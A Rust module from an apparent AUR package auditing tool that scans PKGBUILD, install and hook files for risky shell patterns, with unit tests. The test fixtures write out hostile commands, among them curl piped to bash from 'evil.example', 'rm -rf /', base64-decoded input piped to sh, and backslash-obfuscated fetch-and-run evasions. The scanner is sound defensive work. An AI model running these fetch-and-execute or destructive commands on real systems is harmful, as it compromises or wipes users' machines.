use crate::report::{Finding, Severity};

use super::{first_lines, line_rules::scan_line_rules, re};

pub fn scan_text_file(rel_path: &str, text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let kind = file_kind(rel_path);
    if matches!(kind, FileKind::Shell) {
        scan_unsupported_shell(rel_path, text, &mut findings);
    }

    if rel_path.ends_with(".install") {
        findings.push(Finding::new(
            "install-script.present",
            Severity::Medium,
            rel_path,
            1,
            "Install script file",
            "Pacman install scripts run lifecycle functions as root.",
            "Review post_install, post_upgrade, pre_remove, and post_remove before installing.",
        ));
    }

    if rel_path.ends_with(".hook") {
        findings.push(Finding::new(
            "pacman-hook.present",
            Severity::Medium,
            rel_path,
            1,
            "Pacman hook file",
            "Pacman hooks can run commands during package transactions.",
            "Review trigger scope and Exec command before installing.",
        ));
    }

    if rel_path == ".gitmodules" || rel_path.ends_with("/.gitmodules") {
        findings.push(Finding::new(
            "git.submodules",
            Severity::Medium,
            rel_path,
            1,
            "Git submodules declared",
            "Submodules add additional remote code that may not be visible in the AUR package metadata.",
            "Inspect each submodule URL and pinned commit before building.",
        ));
    }

    let lines = text.lines().collect::<Vec<_>>();
    let mut checksum_block = false;
    for (idx, _line) in lines.iter().enumerate() {
        let line_no = idx + 1;
        let code = strip_shell_comment(&logical_line(&lines, idx));
        let trimmed = code.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let checksum_assignment = re(
            r"(?i)^\s*(?:md5|sha1|sha224|sha256|sha384|sha512|b2)sums(?:_[A-Za-z0-9_]+)?\s*(?:\+?=)",
        )
        .is_match(trimmed);
        let in_checksum_block = checksum_block || checksum_assignment;
        if matches!(kind, FileKind::Shell | FileKind::Hook) {
            scan_line_rules(rel_path, line_no, &code, in_checksum_block, &mut findings);
        }
        if checksum_assignment {
            checksum_block = !trimmed.contains(')');
        } else if checksum_block && trimmed.contains(')') {
            checksum_block = false;
        }
    }

    if matches!(kind, FileKind::Shell) {
        scan_chmod_execute(rel_path, &lines, &mut findings);
    }
    findings
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FileKind {
    Shell,
    Hook,
    Metadata,
    Generic,
}

fn file_kind(rel_path: &str) -> FileKind {
    if rel_path == "PKGBUILD"
        || rel_path.ends_with(".install")
        || rel_path.ends_with(".sh")
        || rel_path.ends_with(".bash")
    {
        FileKind::Shell
    } else if rel_path.ends_with(".hook") {
        FileKind::Hook
    } else if rel_path == ".SRCINFO"
        || rel_path.ends_with(".toml")
        || rel_path.ends_with(".json")
        || rel_path.ends_with(".yaml")
        || rel_path.ends_with(".yml")
    {
        FileKind::Metadata
    } else {
        FileKind::Generic
    }
}

fn strip_shell_comment(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut single = false;
    let mut double = false;
    let mut escaped = false;
    let mut previous_was_whitespace = true;

    for ch in line.chars() {
        if escaped {
            out.push(ch);
            escaped = false;
            previous_was_whitespace = false;
            continue;
        }
        if !single && ch == '\\' {
            out.push(ch);
            escaped = true;
            previous_was_whitespace = false;
            continue;
        }
        if !double && ch == '\'' {
            single = !single;
            out.push(ch);
            previous_was_whitespace = false;
            continue;
        }
        if !single && ch == '"' {
            double = !double;
            out.push(ch);
            previous_was_whitespace = false;
            continue;
        }
        if !single && !double && ch == '#' && previous_was_whitespace {
            break;
        }
        previous_was_whitespace = ch.is_whitespace();
        out.push(ch);
    }
    out
}

fn logical_line(lines: &[&str], index: usize) -> String {
    let mut result = lines[index].to_string();
    let mut next = index + 1;
    while result.trim_end().ends_with('\\') && next < lines.len() {
        result.pop();
        result.push(' ');
        result.push_str(lines[next].trim());
        next += 1;
    }
    result
}

fn scan_unsupported_shell(rel_path: &str, text: &str, findings: &mut Vec<Finding>) {
    let shell_like = rel_path == "PKGBUILD"
        || rel_path.ends_with(".install")
        || rel_path.ends_with(".sh")
        || rel_path.ends_with(".bash");
    if !shell_like {
        return;
    }

    for (line_no, line) in text.lines().enumerate() {
        let trimmed = strip_shell_comment(line).trim().to_string();
        let unsupported =
            re(r"\$\(|`|\$\{|\b(eval|declare\s+-n)\b|<\(|>\(|<<<|<<-?[[:space:]]*[A-Za-z_]")
                .is_match(&trimmed)
                || contains_unquoted_backslash(&trimmed);
        if unsupported {
            findings.push(
                Finding::new(
                    "manual-review.unsupported-shell",
                    Severity::Medium,
                    rel_path,
                    line_no + 1,
                    "Shell construct requires manual review",
                    "This shell construct is outside the lightweight static parser's reliable analysis boundary.",
                    "Inspect the complete construct and its expanded behavior before building.",
                )
                .with_snippet(trimmed),
            );
        }
    }

    if shell_like && has_unbalanced_shell_delimiters(text) {
        findings.push(
            Finding::new(
                "manual-review.ambiguous-shell",
                Severity::High,
                rel_path,
                1,
                "Ambiguous shell syntax",
                "Quotes or structural delimiters are not balanced well enough for reliable static analysis.",
                "Resolve the syntax manually before building.",
            )
            .with_snippet(first_lines(text, 4)),
        );
    }
}

fn contains_unquoted_backslash(line: &str) -> bool {
    let mut single = false;
    let mut double = false;
    let mut escaped = false;

    for ch in line.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if single {
            if ch == '\'' {
                single = false;
            }
            continue;
        }
        if double {
            if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                double = false;
            }
            continue;
        }
        match ch {
            '\\' => return true,
            '\'' => single = true,
            '"' => double = true,
            '#' => break,
            _ => {}
        }
    }

    false
}

fn has_unbalanced_shell_delimiters(text: &str) -> bool {
    let mut single = false;
    let mut double = false;
    let mut escaped = false;
    let mut braces = 0i32;
    let mut parens = 0i32;

    for ch in text.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if ch == '\\' && !single {
            escaped = true;
            continue;
        }
        if ch == '\'' && !double {
            single = !single;
        } else if ch == '"' && !single {
            double = !double;
        } else if !single && !double {
            match ch {
                '{' => braces += 1,
                '}' => braces -= 1,
                '(' => parens += 1,
                ')' => parens -= 1,
                _ => {}
            }
            if braces < 0 || parens < 0 {
                return true;
            }
        }
    }

    single || double || braces != 0 || parens != 0
}

fn scan_chmod_execute(rel_path: &str, lines: &[&str], findings: &mut Vec<Finding>) {
    let chmod_re = re(r"(?i)\bchmod\b[^#\n]*(\+x|[57][0-9]{2,3})\b");
    let exec_re = re(
        r"(^|[;&|[:space:]])(\./|sh[[:space:]]+|bash[[:space:]]+|python[[:space:]]+|perl[[:space:]]+|ruby[[:space:]]+|node[[:space:]]+)",
    );

    for (idx, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        if !chmod_re.is_match(trimmed) {
            continue;
        }
        let end = (idx + 6).min(lines.len());
        let window = &lines[idx + 1..end];
        if window.iter().any(|next| exec_re.is_match(next.trim())) {
            findings.push(
                Finding::new(
                    "execution.chmod-run",
                    Severity::High,
                    rel_path,
                    idx + 1,
                    "chmod +x followed by execution",
                    "A file is made executable and then an executable or interpreter is run shortly after.",
                    "Inspect the generated or downloaded executable before it is run.",
                )
                .with_snippet(trimmed),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_curl_pipe_shell() {
        let findings = scan_text_file("PKGBUILD", "prepare() {\n curl https://x | bash\n}");
        assert!(findings.iter().any(|f| f.rule_id == "shell.remote-pipe"));
    }

    #[test]
    fn detects_chmod_then_execution() {
        let findings = scan_text_file("PKGBUILD", "chmod +x payload\n./payload\n");
        assert!(findings.iter().any(|f| f.rule_id == "execution.chmod-run"));
    }

    #[test]
    fn detects_rm_root() {
        let findings = scan_text_file("bad.install", "post_install() {\n rm -rf /\n}");
        assert!(findings.iter().any(|f| f.rule_id == "dangerous.command"));
    }

    #[test]
    fn detects_base64_decode_long_option() {
        let findings = scan_text_file("bad.install", "echo ZWNobyBoaQ== | base64 --decode | sh");
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation.decoder"));
    }

    #[test]
    fn detects_unsupported_shell_constructs() {
        let findings = scan_text_file(
            "PKGBUILD",
            "prepare() {\n  eval \"$(cat payload)\"\n  cat <(printf x)\n  cat <<EOF\nsecret\nEOF\n}",
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "manual-review.unsupported-shell")
        );
    }

    #[test]
    fn detects_backslash_shell_evasion_as_manual_review() {
        for text in [
            "prepare() {\n  c\\\\url https://evil.example/x | bash\n}",
            "prepare() {\n  cu\\\nrl https://evil.example/x | bash\n}",
        ] {
            let findings = scan_text_file("PKGBUILD", text);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == "manual-review.unsupported-shell"),
                "{text}"
            );
        }
    }

    #[test]
    fn detects_here_string_as_manual_review() {
        let findings = scan_text_file("PKGBUILD", "prepare() {\n  bash<<<\"echo hi\"\n}");
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "manual-review.unsupported-shell")
        );
        let report = crate::report::AuditReport::new("fixture", findings, vec![]);
        assert_ne!(report.status, crate::report::AuditStatus::Pass);
    }

    #[test]
    fn quoted_backslash_does_not_require_manual_review() {
        let findings = scan_text_file(
            "PKGBUILD",
            "prepare() {\n  printf '%s\\n' \"hello\"\n  echo \"\\\\\"\n}",
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == "manual-review.unsupported-shell")
        );
    }

    #[test]
    fn detects_ambiguous_shell_syntax() {
        let findings = scan_text_file("PKGBUILD", "prepare() { echo \"unterminated\n");
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "manual-review.ambiguous-shell")
        );
    }

    #[test]
    fn ignores_checksum_blobs_and_metadata_commands() {
        let checksum = format!(
            "sha256sums=(\n  '{}'\n)\nsha512sums=('{}')\nb2sums=('{}')",
            "a".repeat(64),
            "b".repeat(128),
            "c".repeat(128)
        );
        let findings = scan_text_file("PKGBUILD", &checksum);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "obfuscation.long-base64")
        );

        let metadata = scan_text_file(".SRCINFO", "source = systemd-boot.hook\n");
        assert!(!metadata.iter().any(|f| f.rule_id == "system.modification"));
    }

    #[test]
    fn preserves_payload_detection_and_hook_analysis() {
        let payload = format!("echo {}", "A".repeat(128));
        assert!(
            scan_text_file("PKGBUILD", &payload)
                .iter()
                .any(|f| f.rule_id == "obfuscation.long-base64")
        );

        let hook = scan_text_file(
            "update.hook",
            "[Action]\nExec = /usr/bin/systemctl daemon-reload\n",
        );
        assert!(hook.iter().any(|f| f.rule_id == "pacman-hook.present"));
        assert!(hook.iter().any(|f| f.rule_id == "system.modification"));
    }

    #[test]
    fn comment_aware_matching_preserves_quoted_hashes() {
        let findings = scan_text_file(
            "PKGBUILD",
            "foo=bar # git fetch\nfoo=\"# git fetch\"\nfoo='# git fetch'\nfoo=\\#bar\ngit fetch origin\n",
        );
        assert_eq!(
            findings
                .iter()
                .filter(|f| f.rule_id == "network.git-fetch")
                .count(),
            1
        );
    }

    #[test]
    fn symlink_analysis_uses_destination() {
        let staged = scan_text_file(
            "PKGBUILD",
            "ln -s /usr/share/code/LICENSE \\\n                 \"${pkgdir}/usr/share/licenses/demo/LICENSE\"\n",
        );
        assert!(
            !staged
                .iter()
                .any(|f| f.rule_id == "filesystem.outside-pkgdir")
        );

        let host = scan_text_file("PKGBUILD", "ln -s foo /etc/foo\n");
        assert!(
            host.iter()
                .any(|f| f.rule_id == "filesystem.outside-pkgdir")
        );
    }

    #[test]
    fn parameter_substitution_is_not_dynamic_code() {
        let findings = scan_text_file("PKGBUILD", "x=\"${pkgver//_/-}\"\n");
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "obfuscation.dynamic-code")
        );
    }
}
